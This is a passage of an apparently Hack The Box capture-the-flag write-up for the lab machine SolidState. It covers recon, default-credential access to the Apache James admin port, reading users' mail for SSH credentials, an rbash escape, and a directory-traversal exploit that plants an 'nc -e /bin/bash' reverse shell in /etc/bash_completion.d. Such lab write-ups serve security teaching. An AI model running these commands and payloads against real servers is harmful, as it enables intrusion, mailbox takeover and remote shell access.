@@ -1,0 +1,780 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: SolidState</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-solidstate">htb-solidstate</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#james">james</a> <a class="post-tag" href="/tags#pop3">pop3</a> <a class="post-tag" href="/tags#smtp">smtp</a> <a class="post-tag" href="/tags#bash-completion">bash-completion</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#rbash">rbash</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#directory-traversal">directory-traversal</a> <a class="post-tag" href="/tags#cron">cron</a> <a class="post-tag" href="/tags#pspy">pspy</a> <a class="post-tag" href="/tags#oscp-like-v2">oscp-like-v2</a> <a class="post-tag" href="/tags#oscp-like-v1">oscp-like-v1</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-04-30T10:00:00+00:00" itemprop="datePublished">Apr 30, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/04/30/htb-solidstate.html" style="color: #e6e6e6; text-decoration: none;">HTB: SolidState</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/solidstate-cover.webp" type="image/webp"/>
+<img alt="SolidState" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/solidstate-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>The biggest trick with SolidState was not focusing on the website but rather moving to a vulnerable James mail client. In fact, if I take advantage of a restrictred shell escape, I don’t even need to exploit James, but rather just use the admin interface with default creds to gain access to the various mailboxes, find SSH creds, escape rbash, and continue from there. But I will also show how to exploit James using a directory traversal vulnerability to write a bash completion script and then trigger that with a SSH login. For root, there’s a cron running an writable python script, which I can add a reverse shell to. In Beyond Root, I’ll look at payloads for the James exploit, both exploring what didn’t work, and improving the OPSEC.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/85 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/solidstate" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">SolidState</a> <a href="https://hackthebox.com/machines/solidstate" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-solidstate.webp" type="image/webp"/> <img alt="SolidState" class="img-av" src="/icons/box-solidstate.png"/></picture></a><br/><a href="https://hackthebox.com/machines/solidstate" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">08 Sep 2017</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">27 Jan 2018</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3338" rel="noopener" target="_blank"><img alt="ch33zplz" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3338" style="display: unset"/><span class="user-text" style="display: none"> ch33zplz</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows six open TCP ports, SSH (22), SMTP (25), HTTP (80), POP3 (110), NNTP (119), and James admin (4555):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.51
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:43 EDT
+Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.51
+Host is up (0.043s latency).
+Not shown: 63032 closed ports, 2497 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+119/tcp  open  nntp
+4555/tcp open  rsip
+
+Nmap done: 1 IP address (1 host up) scanned in 28.67 seconds
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,25,80,110,119,4555 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.51
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:48 EDT
+Nmap scan report for 10.10.10.51
+Host is up (0.024s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+25/tcp   open  smtp        JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.47 [10.10.14.47]), 
+80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        JAMES pop3d 2.3.2
+119/tcp  open  nntp        JAMES nntpd (posting ok)
+4555/tcp open  james-admin JAMES Remote Admin 2.3.2
+Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.debian.org/search?keywords=apache2">Apache</a> versions, this looks like Debian 9 stretch.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for Solid State security.</p>
+<div style="max-height: 600px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200426142601193.png">
+<img alt="Solid State Security" src="https://0xdfimages.gitlab.io/img/image-20200426142601193.png" style="clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 575px"><a href="https://0xdfimages.gitlab.io/img/image-20200426142601193.png"><i>Click for full image</i></a></div>
+</div>
+<p>In addition to <code class="language-plaintext highlighter-rouge">index.html</code> (above), there are two other pages, <code class="language-plaintext highlighter-rouge">services.html</code> and <code class="language-plaintext highlighter-rouge">about.html</code>. Each has a lot of text, and each of the three have a form at the bottom:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200426142739394.webp" type="image/webp"/>
+<img alt="image-20200426142739394" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200426142739394.png"/>
+</picture>
+<p>The contact form is interesting, but it just submits a POST to <code class="language-plaintext highlighter-rouge">/</code>, which returns the main page. It doesn’t seem like it’s doing anything.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> doesn’t find anything else of interest:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.51/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-x</span> html <span class="nt">-o</span> scans/gobuster-root-html-small <span class="nt">-t</span> 40 
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.51/
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html
+[+] Timeout:        10s
+===============================================================
+2020/04/26 14:16:48 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/images (Status: 301)
+/about.html (Status: 200)
+/services.html (Status: 200)
+/assets (Status: 301)
+===============================================================
+2020/04/26 14:18:00 Finished
+===============================================================
+</span></code></pre></div></div>
+<p>At this point I’ll move on from HTTP.</p>
+<h3 id="james-mail-server---tcp-251101194555">James Mail Server - TCP 25/110/119/4555</h3>
+<p>James Mail Server is listening on four ports with different functions. Simple Mail Transfer Protocol (SMTP) on TCP 25, Post Office Protocol (POP3) on TCP 110, and Network News Transfer Protocol (NNTP) on TCP 119 are all services that this box is offering. I could look at potentially brute forcing valid user names or sending phishing emails, but first I want to look at port 4555.</p>
+<p>TCP port 4555 is interesting because it is the James administration port. Even without an exploit, if I can access this service, I can likely get into things that might be useful. That said, I’ll first check <code class="language-plaintext highlighter-rouge">searchsploit</code>. <code class="language-plaintext highlighter-rouge">nmap</code> identified this as version 2.3.2, and there’s a match on an RCE exploit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>searchsploit james
+<span class="go">------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                    |  Path
+                                                                  | (/usr/share/exploitdb/)
+------------------------------------------------------------------ ----------------------------------------
+Apache James Server 2.2 - SMTP Denial of Service                  | exploits/multiple/dos/27915.pl
+Apache James Server 2.3.2 - Insecure User Creation Arbitrary File | exploits/linux/remote/48130.rb
+Apache James Server 2.3.2 - Remote Command Execution              | exploits/linux/remote/35513.py
+WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overfl | exploits/windows/remote/944.c
+------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+</span></code></pre></div></div>
+<h2 id="shell-as-mindy">Shell as mindy</h2>
+<h3 id="james-admin--mail-access">James Admin –&gt; Mail Access</h3>
+<p>I can connect to 4555 with <code class="language-plaintext highlighter-rouge">nc</code>, and I’m prompted to login. The default creds of root/root work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc 10.10.10.51 4555
+<span class="go">JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+</span><span class="gp">Login id:</span><span class="w">
+</span><span class="go">root
+</span><span class="gp">Password:</span><span class="w">
+</span><span class="go">root
+Welcome root. HELP for a list of commands
+</span></code></pre></div></div>
+<p>I can get the list of commands with <code class="language-plaintext highlighter-rouge">help</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">help
+Currently implemented commands:
+help                                    display this help
+listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser [username] [password]           add a new user
+verify [username]                       verify if specified user exist
+deluser [username]                      delete existing user
+setpassword [username] [password]       sets a user's password
+setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
+showalias [username]                    shows a user's current email alias
+unsetalias [user]                       unsets an alias for 'user'
+setforwarding [username] [emailaddress] forwards a user's email to another email address
+showforwarding [username]               shows a user's current email forwarding
+unsetforwarding [username]              removes a forward
+user [repositoryname]                   change to another user repository
+shutdown                                kills the current JVM (convenient when James is run as a daemon)
+quit                                    close connection
+</span></code></pre></div></div>
+<p>I can list users to see five accounts:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</span></code></pre></div></div>
+<p>I can change the password for each:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">setpassword -h
+Usage: setpassword [username] [password]
+setpassword james 0xdf0xdf
+Password for james reset
+setpassword thomas 0xdf0xdf
+Password for thomas reset
+setpassword john 0xdf0xdf
+Password for john reset
+setpassword mindy 0xdf0xdf
+Password for mindy reset
+setpassword mailadmin 0xdf0xdf
+Password for mailadmin reset
+</span></code></pre></div></div>
+<p>For each account, I can now connect to TCP 110 (POP3) to check mail. <code class="language-plaintext highlighter-rouge">telnet</code> works best to connect to POP3. The first user, james, has no messages:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>telnet 10.10.10.51 110
+<span class="go">Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER james
++OK
+PASS 0xdf0xdf
++OK Welcome james
+LIST
++OK 0 0
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>I’ll quit (CTRL+] followed by entering <code class="language-plaintext highlighter-rouge">quit</code>), and move on to the next user. No mail in thomas either, but john does show one message:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>telnet 10.10.10.51 110
+<span class="go">Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER john
++OK
+PASS 0xdf0xdf
++OK Welcome john
+LIST
++OK 1 743
+1 743
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>I’ll use the <code class="language-plaintext highlighter-rouge">RETR</code> command to read it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">RETR 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: john@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for &lt;john@localhost&gt;;
+          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
+From: mailadmin@localhost
+Subject: New Hires access
+John, 
+
+Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
+
+Thank you in advance.
+
+Respectfully,
+James
+
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>Good to know. I’ll want to check mindy’s account, which is next on my list anyway. mindy shows two emails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>telnet 10.10.10.51 110
+<span class="go">Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER mindy
++OK
+PASS 0xdf0xdf
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>The first is a welcome email from mailadmin through signed James:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">RETR 1
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
+          for &lt;mindy@localhost&gt;;
+          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>The second, also from mailadmin signed James, contains SSH credentials, and mentions a restricted shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">RETR 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for &lt;mindy@localhost&gt;;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+</span><span class="c">.
+</span></code></pre></div></div>
+<p>mailadmin, despite the juicy username, doesn’t have any email.</p>
+<h3 id="ssh-as-mindy">SSH as mindy</h3>
+<p>I can use the creds from the email to connect over SSH as mindy:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'P@55W0rd1!2@'</span> ssh mindy@10.10.10.51
+<span class="go">Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Apr 29 21:12:15 2020 from 10.10.14.47
+</span><span class="gp">mindy@solidstate:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>As the email suggested, the shell is limited:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mindy@solidstate:~$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">-rbash: whoami: command not found
+</span><span class="gp">mindy@solidstate:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">-rbash: id: command not found
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> shows that mindy’s shell is <code class="language-plaintext highlighter-rouge">rbash</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mindy@solidstate:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
+<span class="go">...[snip]...
+mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
+</span></code></pre></div></div>
+<p>Even in <code class="language-plaintext highlighter-rouge">rbash</code>, I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">mindy@solidstate:~$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bin  user.txt
+</span><span class="gp">mindy@solidstate:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">914d0a4e************************
+</span></code></pre></div></div>
+<h2 id="rbash-escape">rbash Escape</h2>
+<h3 id="quick-method">Quick Method</h3>
+<p>The first thing I try when facing SSH into <code class="language-plaintext highlighter-rouge">rbash</code> is adding <code class="language-plaintext highlighter-rouge">-t bash</code> to the SSH connection command. This will run <code class="language-plaintext highlighter-rouge">bash</code> on connect instead of the assigned shell. It works here (though it does produce a busted prompt), and I an now run <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">cd</code>:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'P@55W0rd1!2@'</span> ssh mindy@10.10.10.51 <span class="nt">-t</span> bash
+<span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+</span><span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$</span><span class="w"> </span><span class="nb">cd</span> /
+<span class="gp">${debian_chroot:+($debian_chroot)}mindy@solidstate:/$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+</span></code></pre></div></div>
+<h3 id="intended-path">Intended Path</h3>
+<h4 id="exploit-theory">Exploit Theory</h4>
+<p>I believe the intended path was to take advantage of the James 2.3.2 exploit, which I’ll show now. First, I’ll take a look at the exploit from <code class="language-plaintext highlighter-rouge">searchsploit</code>.</p>
+<p>When a user is created in James, a folder is created for that user based on their username, and when email comes in, it is stored in that folder. The issue is that no bounds checking is done on that user name, so if the user is named <code class="language-plaintext highlighter-rouge">../../../../../../../0xdf</code>, then it will create that folder at the root level and drop files in it with the contents of received emails.</p>
+<p>The question then becomes, how can I use this semi-arbitrary root write access to my advantage? I can control the folder that’s written into, but not fully the filename. This eliminates ideas like writing a public key into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> or changing the <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> or <code class="language-plaintext highlighter-rouge">/etc/passwd</code> files.</p>
+<p>The solution the script authors came up with is a good one. Bash completion scripts provide custom tab completion for various commands. For example, when I type <code class="language-plaintext highlighter-rouge">git stat[tab]</code>, it auto completes <code class="language-plaintext highlighter-rouge">git status</code> based on a git bash completion script that runs each time a session starts on my host. In fact, a few weeks ago I was looking at writing custom bash completion scripts, and it’s not hard. I tweeted a really nice overwview post:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">Creating some scripts to manage things, and wanted to add tab complete for the options. It was super easy. This article was a really good overview:<a href="https://t.co/6LHD16wT5l">https://t.co/6LHD16wT5l</a></p>— 0xdf (@0xdf_) <a href="https://twitter.com/0xdf_/status/1249390368640192515?ref_src=twsrc%5Etfw">April 12, 2020</a></blockquote>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script>
+<p>Anyway, by writing to <code class="language-plaintext highlighter-rouge">/etc/bash_completion.d</code>, when any user logs in, that user will run each file in there as a <code class="language-plaintext highlighter-rouge">bash</code> script.</p>
+<h4 id="script-review">Script Review</h4>
+<p>Opening the script, I see exactly the process as described above:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/james-exploit.png"><img alt="James Exploit Notes" src="https://0xdfimages.gitlab.io/img/james-exploit.png"/><em>Click for full size image</em></a></p>
+<h4 id="manual-exploitation">Manual Exploitation</h4>
+<p>Seeing what the script does, I’ll try this manually with <code class="language-plaintext highlighter-rouge">nc</code> and <code class="language-plaintext highlighter-rouge">telnet</code>. First, create a user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc 10.10.10.51 4555
+<span class="go">JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+adduser ../../../../../../../../etc/bash_completion.d 0xdf0xdf
+User ../../../../../../../../etc/bash_completion.d added
+quit
+Bye
+</span></code></pre></div></div>
+<p>Now, I’ll send that user an email with a reverse shell, connecting to SMTP on 25:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>telnet 10.10.10.51 25
+<span class="go">Trying 10.10.10.51...  
+Connected to 10.10.10.51.     
+Escape character is '^]'.              
+220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 22:28:40 -0400 (EDT)
+EHLO 0xdf
+250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
+250-PIPELINING                            
+250 ENHANCEDSTATUSCODES
+MAIL FROM: &lt;'0xdf@10.10.14.47&gt;
+250 2.1.0 Sender &lt;'0xdf@10.10.14.47&gt; OK 
+RCPT TO: &lt;../../../../../../../../etc/bash_completion.d&gt;
+250 2.1.5 Recipient &lt;../../../../../../../../etc/bash_completion.d@localhost&gt; OK
+DATA
+354 Ok Send data ending with &lt;CRLF&gt;.&lt;CRLF&gt;               
+FROM: 0xdf@10.10.14.47            
+'
+/bin/nc -e /bin/bash 10.10.14.47 443
+</span><span class="c">.
+</span><span class="go">250 2.6.0 Message received                          
+quit                                                      
+221 2.0.0 solidstate Service closing transmission channel
+Connection closed by foreign host.     
+</span></code></pre></div></div>
+<p>This creates a file in <code class="language-plaintext highlighter-rouge">/etc/bash_completion.d</code> that contains my reverse shell. So the next time any user logs in, I’ll get a shell as that user. It is important to add the <code class="language-plaintext highlighter-rouge">'</code> at the start of the first header, <code class="language-plaintext highlighter-rouge">MAIL FROM</code>. Then I close that <code class="language-plaintext highlighter-rouge">'</code> just before my payload. Later, when this file is run by <code class="language-plaintext highlighter-rouge">bash</code>, that will lump all those lines into one broken command, which will fail and continue. Without the <code class="language-plaintext highlighter-rouge">'</code>, there are lines that will crash and break the script before the reverse shell can run.</p>
+<p>I had to play with payloads to get this working, and I’ll explore this a bit in <a href="#curious-case-of-devtcp">Beyond Root</a>. I did find when doing things manually, <code class="language-plaintext highlighter-rouge">/bin/nc -e /bin/bash 10.10.14.47 443</code> worked, where as others didn’t. When using the Python script, several payloads worked. That seems to have to do with the way the Python script can add <code class="language-plaintext highlighter-rouge">\r</code>.</p>
+<h4 id="trigger---shell">Trigger -&gt; Shell</h4>
+<p>Now I can SSH as mindy, and trigger the code. There are new <code class="language-plaintext highlighter-rouge">rbash</code> errors from the exploit, and then the terminal just hangs:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'P@55W0rd1!2@'</span> ssh mindy@10.10.10.51
+<span class="go">Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
+-rbash: L: command not found
+-rbash: attributestLjava/util/HashMap: No such file or directory
+-rbash: L
+         errorMessagetLjava/lang/String: No such file or directory
+-rbash: L
+         lastUpdatedtLjava/util/Date: No such file or directory
+-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
+-rbash: $'L\004nameq~\002L': command not found
+-rbash: recipientstLjava/util/Collection: No such file or directory
+-rbash: L: command not found
+-rbash: $'remoteAddrq~\002L': command not found
+-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
+-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
+-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
+-rbash: 0xdf@10.10.14.47&gt;
+Message-ID: &lt;4054205.0.1588213770563.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
+Received: from 10.10.14.47 ([10.10.14.47])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 148
+          for &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;;
+          Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
+Date: Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
+FROM: 0xdf@10.10.14.47
+: No such file or directory
+</span></code></pre></div></div>
